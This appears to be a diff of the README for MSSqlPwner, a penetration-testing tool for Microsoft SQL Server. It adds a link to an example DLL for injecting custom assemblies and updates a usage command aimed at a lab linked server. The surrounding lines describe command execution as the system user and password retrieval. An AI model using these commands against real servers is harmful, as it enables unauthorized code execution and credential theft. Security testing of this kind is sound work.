@@ -55,7 +55,7 @@ This tool is designed for security professionals and researchers for testing pur
 - `execute_command` procedure executing commands using custom assembly on local server or on linked servers
 - `run_query` procedure executing queries using custom assembly on local server or on linked servers
 - `run_query_system_service` procedure executing queries using custom assembly on local server or on linked servers as system user
-- `inject-custom-asm` Inject code using custom assembly on local server or on linked servers
+- `inject-custom-asm` Inject code using custom assembly on local server or on linked servers (You can use modify the following [DLL Example](https://github.com/ScorpionesLabs/MSSqlPwner/blob/main/playbooks/custom-asm/Inject.cs).
 6. Direct Queries 
 - `direct_query` Execute direct queries on local server or on linked servers
 
@@ -120,7 +120,7 @@ python3 MSSqlPwner.py corp.com/user:lab@192.168.1.65 -windows-auth direct_query 
 python3 MSSqlPwner.py corp.com/user:lab@192.168.1.65 -windows-auth -link-server DC01 retrive-password
 
 # Execute code using custom assembly on the linked server DC01
-python3 MSSqlPwner.py corp.com/user:lab@192.168.1.65 -windows-auth -link-server DC01 inject-custom-asm test.dll
+python3 MSSqlPwner.py corp.com/user:lab@192.168.1.65 -windows-auth -link-server DC01 inject-custom-asm SqlInject.dll
 ```
 
 
